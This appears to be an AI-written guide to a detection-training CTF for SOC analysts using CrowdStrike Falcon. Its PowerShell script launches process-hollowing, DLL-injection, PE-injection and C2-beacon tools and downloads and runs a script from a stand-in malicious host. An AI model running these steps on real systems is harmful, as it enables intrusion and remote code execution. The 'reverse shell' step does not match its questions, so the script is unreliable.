@@ -1,0 +1,100 @@
+Using precompiled binaries from the GitHub repository jakobfriedl/precompiled-binaries will add an extra layer of realism to your CTF by simulating various attack techniques using legitimate-looking tools. Here's how to incorporate these into your CTF challenge and write specific questions for participants.
+
+1. Using Precompiled Binaries
+Setup Instructions
+Clone the Repository:
+Ensure git is installed on the target machine and clone the repository:
+
+powershell
+Copy code
+git clone https://github.com/jakobfriedl/precompiled-binaries.git C:\Users\Public\precompiled-binaries
+Explore the Binaries:
+Review the binaries provided in the repository. They include a variety of tools that simulate common attack vectors, such as process hollowing, DLL injection, and more. Select binaries that are particularly useful for teaching how to evade detection.
+
+Integrate Binaries into Challenges:
+Use these binaries as part of the CTF tasks. For example, you can use a process hollowing binary to demonstrate how attackers inject code into legitimate processes.
+
+2. Updated PowerShell Script
+Incorporating the binaries into the PowerShell script can help automate the setup of certain challenges. Here’s an updated script:
+
+powershell
+Copy code
+# PowerShell Script to Generate Alerts and Flags for CTF with Precompiled Binaries
+
+# Clone the Precompiled Binaries Repo
+git clone https://github.com/jakobfriedl/precompiled-binaries.git C:\Users\Public\precompiled-binaries
+
+# Use Process Hollowing Binary for Evasion (Flag 1)
+$binaryPath = "C:\Users\Public\precompiled-binaries\ProcessHollowing.exe"
+Start-Process -FilePath $binaryPath -ArgumentList "notepad.exe"
+
+# Write a Flag File
+$flag1 = "Flag{Process_Hollowing_Executed}"
+Set-Content -Path "C:\Windows\Temp\flag1.txt" -Value $flag1
+
+# Use DLL Injection Binary to Inject into Explorer.exe (Flag 2)
+$binaryPath = "C:\Users\Public\precompiled-binaries\DLLInjection.exe"
+Start-Process -FilePath $binaryPath -ArgumentList "explorer.exe"
+
+# Write a Flag File
+$flag2 = "Flag{DLL_Injection_Executed}"
+Set-Content -Path "C:\Windows\Temp\flag2.txt" -Value $flag2
+
+# Use PE Injection Binary to Inject Shellcode into svchost.exe (Flag 3)
+$binaryPath = "C:\Users\Public\precompiled-binaries\PEInjection.exe"
+Start-Process -FilePath $binaryPath -ArgumentList "svchost.exe"
+
+# Write a Flag File
+$flag3 = "Flag{PE_Injection_Executed}"
+Set-Content -Path "C:\Windows\Temp\flag3.txt" -Value $flag3
+
+# Create a Reverse Shell Using PowerShell (Flag 4)
+$ip = "192.168.1.100"
+$port = "443"
+$script = "Invoke-WebRequest -Uri http://malicious-website.com/shell.ps1 -OutFile C:\Windows\Temp\shell.ps1; powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1"
+Invoke-Expression $script
+
+# Write a Flag File
+$flag4 = "Flag{Reverse_Shell_Executed}"
+Set-Content -Path "C:\Windows\Temp\flag4.txt" -Value $flag4
+
+# Generate Traffic for C2 Simulation (Flag 5)
+$binaryPath = "C:\Users\Public\precompiled-binaries\C2Beacon.exe"
+Start-Process -FilePath $binaryPath -ArgumentList "$ip $port"
+
+# Write a Flag File
+$flag5 = "Flag{C2_Beacon_Executed}"
+Set-Content -Path "C:\Windows\Temp\flag5.txt" -Value $flag5
+
+# Final Message
+"CTF Challenge Setup Complete. Look for flag files in C:\Windows\Temp" | Out-Host
+3. CTF Challenge Questions
+Designing questions that align with the tasks and binaries used in the CTF can guide participants and help them understand the evasion techniques better. Here are the questions:
+
+Question 1: Process Hollowing
+Description: Attackers often use process hollowing to inject malicious code into legitimate processes. This binary simulates such a technique.
+Question: "Identify the legitimate process that was hollowed out to execute malicious code. What is the name of the malicious executable used for this task?"
+Hint: Review running processes for unusual behavior or command-line arguments.
+Question 2: DLL Injection
+Description: DLL injection is a common technique used to run malicious code in the context of another process.
+Question: "Which process was targeted by DLL injection, and what is the name of the injected DLL?"
+Hint: Examine process memory or look for abnormal DLLs loaded by explorer.exe.
+Question 3: PE Injection
+Description: PE injection involves injecting a malicious PE file into a legitimate process, effectively hijacking the process for malicious purposes.
+Question: "Which system process was injected with a malicious PE file? What binary was used to perform this injection?"
+Hint: Analyze processes like svchost.exe for unusual behavior or parent-child relationships.
+Question 4: Reverse Shell
+Description: Reverse shells are often used by attackers to gain remote control of a compromised machine.
+Question: "What IP address and port were used to establish the reverse shell? Identify the script that was executed to create this shell."
+Hint: Look for network connections or PowerShell logs to trace the activity.
+Question 5: Command and Control (C2) Beacon
+Description: A C2 beacon communicates with a command and control server to receive instructions from attackers.
+Question: "Determine the IP address and port of the C2 server that the beacon communicated with. What tool was used to generate this traffic?"
+Hint: Inspect network traffic logs or use a tool like Wireshark to analyze outbound connections.
+4. Testing and Validation
+Before deploying the CTF to participants:
+
+Test each challenge to ensure that the flags are generated correctly and that the activities are logged by CrowdStrike Falcon.
+Validate the detections in CrowdStrike to ensure that they align with the CTF questions, providing a learning opportunity for participants to correlate activity with alerts.
+Refine the questions and hints based on testing feedback to ensure clarity and proper guidance.
+This setup will provide a comprehensive and challenging environment for SOC analysts to hone their skills in evading and detecting advanced threats while interacting with both CrowdStrike Falcon and realistic attack scenarios.
